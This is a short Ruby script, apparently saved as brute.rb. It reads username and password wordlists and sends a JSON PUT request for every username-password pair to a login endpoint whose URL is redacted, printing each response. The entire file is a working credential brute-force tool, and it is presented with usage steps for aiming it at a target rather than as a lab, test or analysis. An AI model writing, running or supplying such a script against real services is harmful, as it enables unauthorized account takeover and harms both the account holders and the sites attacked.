require 'net/http'
require 'uri'
require 'json'

# Send multiple HTTP requests with different loginUsername and loginPassword values
#
# This script reads two files containing different loginUsername and loginPassword values (one per line)
# and sends PUT requests to the specified URL with those values.
# The token and rememberMe values are hard-coded in this script.
#
# Usage:
#   1. Replace the `url` value with the target URL.
#   2. Replace the `usernames_file_path` and `passwords_file_path` values with the paths to the input files.
#   3. Replace the `token` value with a session token if needed.
#   3. Run the script with `ruby brute.rb`.

def send_request(url, login_username, login_password, token, remember_me)
  uri = URI(url)
  https = Net::HTTP.new(uri.host, uri.port)
  https.use_ssl = true

  request = Net::HTTP::Put.new(uri.path)
  request['Content-Type'] = 'application/json'
  request.body = {
    loginUsername: login_username,
    loginPassword: login_password,
    token: token,
    rememberMe: remember_me
  }.to_json

  response = https.request(request)
  puts response.body
end

url = 'REDACTED'
usernames_file_path = './Username.txt'
passwords_file_path = './Password.txt'
token = ''
remember_me = 'false'

usernames = File.read(usernames_file_path).split("\n")
passwords = File.read(passwords_file_path).split("\n")

usernames.each do |login_username|
  passwords.each do |login_password|
    send_request(url, login_username, login_password, token, remember_me)
  end
end